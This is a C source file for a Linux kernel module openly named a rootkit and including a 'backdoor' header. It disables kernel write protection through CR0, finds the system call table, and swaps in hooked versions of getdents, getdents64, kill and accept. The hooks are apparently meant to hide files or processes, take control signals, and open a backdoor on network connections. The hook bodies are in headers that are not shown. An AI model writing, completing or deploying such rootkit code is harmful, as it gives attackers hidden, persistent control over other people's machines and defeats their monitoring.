#include "inc/version.h"
#include "inc/utils.h"
#include "inc/backdoor.h"
#include "inc/hooks.h"
#include <linux/module.h>
#include <linux/kernel.h>

unsigned long *__sys_call_table;
t_syscall orig_getdents;
t_syscall orig_getdents64;
t_syscall orig_kill;
t_syscall orig_accept;

static int __init rootkit_init(void) {
    __sys_call_table = get_syscall_table();
    if (!__sys_call_table)
        return -1;

    write_cr0(read_cr0() & ~0x00010000);

    orig_getdents = (t_syscall) __sys_call_table[__NR_getdents];
    orig_getdents64 = (t_syscall) __sys_call_table[__NR_getdents64];
    orig_kill = (t_syscall) __sys_call_table[__NR_kill];
    orig_accept = (t_syscall) __sys_call_table[__NR_accept];

    __sys_call_table[__NR_getdents] = (unsigned long) hooked_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long) hooked_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long) hooked_kill;
    __sys_call_table[__NR_accept] = (unsigned long) hooked_accept;

    write_cr0(read_cr0() | 0x00010000);

    return 0;
}

static void __exit rootkit_exit(void) {
    if (!__sys_call_table)
        return;

    write_cr0(read_cr0() & ~0x00010000);

    __sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long) orig_kill;
    __sys_call_table[__NR_accept] = (unsigned long) orig_accept;

    write_cr0(read_cr0() | 0x00010000);
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0XJ");